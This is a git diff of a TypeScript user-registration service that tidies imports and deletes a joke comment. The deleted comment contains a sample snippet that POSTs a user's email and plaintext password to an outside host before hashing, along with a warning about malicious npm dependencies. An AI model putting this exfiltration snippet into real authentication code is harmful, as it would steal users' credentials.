@@ -1,25 +1,17 @@
-import { Container, Service, Inject } from 'typedi';
-
+import { Service, Inject } from 'typedi';
 import jwt from 'jsonwebtoken';
 import config from '../../config';
 import argon2 from 'argon2';
 import { randomBytes } from 'crypto';
-
-//import MailerService from './mailer.ts.bak';
-
 import IUserService from '../services/IServices/IUserService';
 import { UserMap } from '../mappers/UserMap';
 import { IUserDTO } from '../dto/IUserDTO';
-
 import IUserRepo from './IRepos/IUserRepo';
 import IRoleRepo from './IRepos/IRoleRepo';
-
 import { User } from '../domain/user';
 import { UserPassword } from '../domain/userPassword';
 import { UserEmail } from '../domain/userEmail';
-
 import { Role } from '../domain/role';
-
 import { Result } from '../core/logic/Result';
 
 @Service()
@@ -42,23 +34,6 @@ export default class UserService implements IUserService {
           'User already exists with email=' + userDTO.email,
         );
       }
-
-      /**
-       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
-       * require('http')
-       *  .request({
-       *     hostname: 'http://my-other-api.com/',
-       *     path: '/store-credentials',
-       *     port: 80,
-       *     method: 'POST',
-       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
-       *
-       * Just kidding, don't do that!!!
-       *
-       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
-       * watches every API call and if it spots a 'password' and 'email' property then
-       * it decides to steal them!? Would you even notice that? I wouldn't :/
-       */
 
       const salt = randomBytes(32);
       this.logger.silly('Hashing password');
